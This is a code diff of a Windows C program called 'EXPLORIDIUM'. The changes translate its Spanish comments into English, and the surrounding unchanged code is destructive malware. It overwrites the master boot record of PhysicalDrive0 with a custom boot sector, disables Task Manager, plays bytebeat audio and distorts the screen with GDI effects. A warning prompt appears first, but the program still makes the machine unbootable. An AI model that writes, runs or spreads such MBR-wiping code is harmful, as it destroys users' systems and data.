@@ -10,7 +10,7 @@
 int payloadActual = 1;
 bool activo = true;
 
-// --- FUNCIÓN DE AUDIO AÑADIDA ---
+// --- Audio Function ---
 DWORD WINAPI AudioEngine(LPVOID lpParam) {
     HWAVEOUT hWaveOut;
     WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
@@ -21,7 +21,7 @@ DWORD WINAPI AudioEngine(LPVOID lpParam) {
 
     while (activo) {
         for (int i = 0; i < sizeof(buffer); i++) {
-            // Genera un sonido de "bytebeat" basado en el payload actual
+            // Generate different sounds based on payloadActual
             buffer[i] = (char)((i * (i >> (payloadActual + 4))) | (i << 1));
         }
         waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
@@ -33,7 +33,7 @@ DWORD WINAPI AudioEngine(LPVOID lpParam) {
     return 0;
 }
 
-// MBR con Fractal de Mandelbrot y Mensaje
+// MBR with Fractal Drawing Payload and Message
 void OverwriteMBR() {
     unsigned char mandelbrot_mbr[512] = {
         0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xDB, 0x8E, 0xC3, 0x31, 0xC9, 0x31, 0xD2, 0xBF, 0x00, 0xA0,
@@ -45,7 +45,7 @@ void OverwriteMBR() {
     };
     mandelbrot_mbr[510] = 0x55; mandelbrot_mbr[511] = 0xAA;
     DWORD wb;
-    // Intentar abrir el disco físico (Requiere Ejecutar como Administrador)
+    // Try Open the Physic Disk (Execute as Admin required)
     HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     if (h != INVALID_HANDLE_VALUE) { 
         WriteFile(h, mandelbrot_mbr, 512, &wb, 0); 
@@ -63,14 +63,14 @@ void DisableTaskMgr() {
 }
 
 int main() {
-    // Advertencia inicial
+    // Initial Warning Message
     if (MessageBoxA(NULL, "ADVERTENCIA: Este programa destruirá el arranque del sistema (MBR) y causará efectos visuales intensos. ¿Deseas continuar?", "EXPLORIDIUM - PELIGRO", MB_YESNO | MB_ICONSTOP) == IDNO) 
         exit(0);
     
     DisableTaskMgr();
     OverwriteMBR();
     
-    // Iniciar el hilo de audio
+    // Audio Thread
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AudioEngine, NULL, 0, NULL);
     
     HDC hdc = GetDC(0);
@@ -81,7 +81,7 @@ int main() {
         payloadActual = ((GetTickCount() - tiempoInicio) / 20000) + 1; // Cambia cada 20 segundos
         if (payloadActual > 10) break;
 
-        // Efectos GDI
+        // GDI Visual Effects
         if (payloadActual == 3) {
             int x = rand() % sw;
             BitBlt(hdc, x, rand() % 40 - 20, 150, sh, hdc, x, 0, SRCCOPY);
